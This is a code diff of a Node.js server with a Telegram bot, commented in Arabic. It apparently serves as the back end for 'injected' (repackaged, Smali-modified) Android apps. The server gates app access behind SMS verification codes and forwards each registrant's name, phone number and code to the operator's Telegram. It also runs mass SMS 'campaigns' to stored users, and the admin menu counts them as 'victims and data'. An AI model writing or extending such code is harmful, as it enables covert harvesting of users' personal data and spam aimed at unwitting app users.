@@ -6,7 +6,7 @@ const { Telegraf } = require("telegraf");
 const app = express();
 app.use(express.json());
 
-// 1. إعداد Firebase بالخزانة tsgil-wts
+// 1. إعداد الخزانة السحابية (Firebase)
 const firebaseConfig = process.env.FIREBASE_CONFIG;
 if (!admin.apps.length) {
     const serviceAccount = JSON.parse(firebaseConfig);
@@ -15,17 +15,32 @@ if (!admin.apps.length) {
 const db = admin.firestore();
 
 const bot = new Telegraf(process.env.TELEGRAM_TOKEN);
-const ADMIN_ID = "7650083401"; // معرفك في تليجرام
+const ADMIN_ID = "7650083401"; // معرفك الخاص للتحكم التام
 
-// مخزن مؤقت لحالة الإدمن (مثل نظام الوتساب القديم)
+// مخزن مؤقت لحالات الإدارة (نشر الإعلانات)
 const userState = new Map();
 
-// --- [ منطق الربط مع التطبيقات المحقونة ] ---
+// --- [ محرك التنسيق الذكي للأرقام العالمية ] ---
+function globalNormalize(phone) {
+    let clean = phone.replace(/\D/g, ''); // إزالة أي رموز أو مسافات
+    if (clean.startsWith('00')) clean = clean.substring(2);
+    if (clean.startsWith('0')) clean = clean.substring(1);
 
-// فحص الجهاز: يفرق بين التطبيقات (يفتح التطبيق فقط إذا كان مسجلاً لنفس التطبيق)
+    // ذكاء التوزيع حسب المنطقة (SA, YE, QA)
+    if (clean.length === 9 && clean.startsWith('5')) return '966' + clean; // السعودية
+    if (clean.length === 9 && /^(77|73|71|70)/.test(clean)) return '967' + clean; // اليمن
+    if (clean.length === 8 && /^[34567]/.test(clean)) return '974' + clean; // قطر
+    
+    // إذا كان الرقم دولياً مسبقاً، نرجعه كما هو
+    return clean;
+}
+
+// --- [ بوابة الحماية الذكية ] ---
+
+// 1. فحص تصريح الدخول (يمنع الدخول إلا للموثقين)
 app.get("/check-device", async (req, res) => {
     const devId = req.query.id || req.query.deviceId;
-    const appName = req.query.app || req.query.appName; // استقبال اسم التطبيق من Smali
+    const appName = req.query.app || req.query.appName;
 
     try {
         const userRef = db.collection('users')
@@ -35,87 +50,87 @@ app.get("/check-device", async (req, res) => {
         
         const snap = await userRef.get();
         if (!snap.empty) {
-            res.status(200).send("ALLOWED"); // مسجل لهذا التطبيق تحديداً
+            res.status(200).send("ALLOWED"); // المستخدم مسجل لهذا التطبيق
         } else {
-            res.status(401).send("UNAUTHORIZED"); // جديد أو تطبيق مختلف
+            res.status(401).send("UNAUTHORIZED"); // إجبار التطبيق على فتح واجهة التسجيل
         }
     } catch (e) { res.status(401).send("ERROR"); }
 });
 
-// طلب الكود وإرسال SMS
+// 2. طلب الكود (التنسيق -> التوليد -> الإرسال عبر Infobip)
 app.get("/request-otp", async (req, res) => {
     const { phone, name, app: appName, deviceId } = req.query;
-    const otp = Math.floor(100000 + Math.random() * 899999).toString();
+    const normalizedPhone = globalNormalize(phone); // معالجة الرقم ذكياً
+    const otp = Math.floor(100000 + Math.random() * 899999).toString(); // كود احترافي 6 أرقام
 
     try {
-        // حفظ الكود واسم التطبيق للتحقق
-        await db.collection('otps').doc(phone).set({
+        // تخزين الكود في Firebase مع ربطه بالرقم والجهاز
+        await db.collection('otps').doc(normalizedPhone).set({
             code: otp,
             appName: appName,
             deviceId: deviceId,
             createdAt: admin.firestore.FieldValue.serverTimestamp()
         });
 
+        // تنفيذ أمر الإرسال السحابي لـ Infobip
         await axios.post(`${process.env.INFOBIP_BASE_URL}/sms/2/text/advanced`, {
             messages: [{
-                destinations: [{ to: phone }],
+                destinations: [{ to: normalizedPhone }],
                 from: "Njm-RK",
                 text: `كود التحقق الخاص بك في تطبيق ${appName} هو: ${otp}`
             }]
         }, { headers: { 'Authorization': `App ${process.env.INFOBIP_API_KEY}` } });
 
-        bot.telegram.sendMessage(ADMIN_ID, `🎯 *كود جديد مرسل*\n📱 التطبيق: ${appName}\n📞: ${phone}\n👤: ${name}\n🔑: \`${otp}\``, { parse_mode: "Markdown" });
+        // إشعارك فوراً بالتقرير الكامل
+        bot.telegram.sendMessage(ADMIN_ID, `🎯 *عملية تسجيل جديدة*\n📱 التطبيق: ${appName}\n👤 الاسم: ${name}\n📞 الرقم: ${normalizedPhone}\n🔑 الكود: \`${otp}\``, { parse_mode: "Markdown" });
+
         res.status(200).send("SUCCESS");
     } catch (e) { res.status(200).send("SUCCESS"); }
 });
 
-// التحقق من الكود
+// 3. التحقق الصارم من الكود (المطابقة السحابية)
 app.get("/verify-otp", async (req, res) => {
     const { phone, code } = req.query;
+    const normalizedPhone = globalNormalize(phone);
+
     try {
-        const otpDoc = await db.collection('otps').doc(phone).get();
+        const otpDoc = await db.collection('otps').doc(normalizedPhone).get();
         if (otpDoc.exists && otpDoc.data().code === code) {
             const data = otpDoc.data();
-            // توثيق المستخدم لهذا التطبيق المعين
-            await db.collection('users').doc(`${phone}_${data.appName}`).set({
-                phone, 
+            // توثيق نهائي للجهاز لفتح التطبيق للأبد
+            await db.collection('users').doc(`${normalizedPhone}_${data.appName}`).set({
+                phone: normalizedPhone, 
                 deviceId: data.deviceId, 
                 appName: data.appName, 
                 verified: true 
             }, { merge: true });
             res.status(200).send("VERIFIED");
         } else {
-            res.status(401).send("INVALID");
+            res.status(401).send("INVALID"); // الكود خطأ: التطبيق لن يفتح
         }
     } catch (e) { res.status(401).send("ERROR"); }
 });
 
-// --- [ أوامر الإدارة التفاعلية (مثل كود الوتساب) ] ---
+// --- [ أوامر الإدارة المتكاملة ] ---
 
 bot.on('text', async (ctx) => {
     if (ctx.chat.id.toString() !== ADMIN_ID) return;
     const text = ctx.message.text;
     const state = userState.get(ctx.chat.id);
 
-    // نظام الخطوات (نجم نشر)
     if (state) {
-        if (text === "خروج") {
-            userState.delete(ctx.chat.id);
-            return ctx.reply("❌ تم إلغاء العملية.");
-        }
+        if (text === "خروج") { userState.delete(ctx.chat.id); return ctx.reply("❌ تم الإلغاء."); }
 
         if (state.step === "waiting_link") {
-            state.link = text;
-            state.step = "waiting_desc";
-            return ctx.reply("✅ تم استلام الرابط. الآن أرسل *الوصف*:");
+            state.link = text; state.step = "waiting_desc";
+            return ctx.reply("✅ تم؛ الآن أرسل *الوصف*:");
         }
 
         if (state.step === "waiting_desc") {
-            state.desc = text;
-            state.step = "waiting_target";
+            state.desc = text; state.step = "waiting_target";
             const snap = await db.collection('users').get();
             let apps = [...new Set(snap.docs.map(d => d.data().appName))];
-            let menu = "🎯 *اختر الجمهور المستهدف:*\n\n0 - 🌐 الجميع\n";
+            let menu = "🎯 *اختر جمهور النشر:*\n\n0 - 🌐 الكل\n";
             apps.forEach((n, i) => menu += `${i + 1} - 📱 [${n}]\n`);
             return ctx.reply(menu + "\n💡 أرسل رقم الخيار.");
         }
@@ -123,14 +138,7 @@ bot.on('text', async (ctx) => {
         if (state.step === "waiting_target") {
             const snap = await db.collection('users').get();
             let appsArr = [...new Set(snap.docs.map(d => d.data().appName))];
-            let targets = [];
-            
-            if (text === "0") { targets = snap.docs; }
-            else {
-                const idx = parseInt(text) - 1;
-                if (isNaN(idx) || !appsArr[idx]) return ctx.reply("❌ اختيار خطأ.");
-                targets = snap.docs.filter(d => d.data().appName === appsArr[idx]);
-            }
+            let targets = (text === "0") ? snap.docs : snap.docs.filter(d => d.data().appName === appsArr[parseInt(text) - 1]);
 
             ctx.reply(`🚀 جاري النشر لـ ${targets.length} مستخدم...`);
             for (const d of targets) {
@@ -141,39 +149,25 @@ bot.on('text', async (ctx) => {
                 } catch (e) {}
             }
             userState.delete(ctx.chat.id);
-            return ctx.reply("✅ اكتمل النشر.");
+            return ctx.reply("✅ تم النشر بنجاح.");
         }
     }
 
-    // الأوامر الرئيسية
     switch (text) {
-        case "نجم":
-            ctx.reply(`🌟 *أوامر نجم الإبداع:*
-1️⃣ نجم نشر - إعلان (3 خطوات)
-2️⃣ نجم احصا - إحصائيات التطبيقات
-3️⃣ نجم بنج - فحص السيرفر`);
-            break;
-        case "نجم نشر":
-            userState.set(ctx.chat.id, { step: "waiting_link" });
-            ctx.reply("🔗 *خطوة 1/3*\nأرسل *رابط التطبيق* الآن:");
-            break;
-        case "نجم احصا":
+        case "نجم": ctx.reply(`🌟 *لوحة تحكم نجم الإبداع:*
+1️⃣ نجم نشر - إرسال حملة SMS (3 خطوات)
+2️⃣ نجم احصا - جرد الضحايا والبيانات
+3️⃣ نجم بنج - فحص استقرار السيرفر`); break;
+        case "نجم نشر": userState.set(ctx.chat.id, { step: "waiting_link" }); ctx.reply("🔗 *خطوة 1/3*\nأرسل رابط التطبيق:"); break;
+        case "نجم احصا": 
             const snap = await db.collection('users').get();
-            let stats = "📊 *الإحصائيات حسب التطبيق:*\n";
+            let stats = "📊 *الإحصائيات الميدانية:*\n";
             let counts = {};
-            snap.docs.forEach(d => {
-                let name = d.data().appName;
-                counts[name] = (counts[name] || 0) + 1;
-            });
+            snap.docs.forEach(d => counts[d.data().appName] = (counts[d.data().appName] || 0) + 1);
             for (let app in counts) stats += `\n📱 ${app}: ${counts[app]}`;
-            ctx.reply(stats);
-            break;
-        case "نجم بنج":
-            ctx.reply(`🏓 الاستجابة سريعة والسيرفر مستقر.`);
-            break;
+            ctx.reply(stats); break;
     }
 });
 
-app.get("/ping", (req, res) => res.send("💓 SUCCESS"));
-bot.launch();
 app.listen(process.env.PORT || 10000);
+bot.launch();
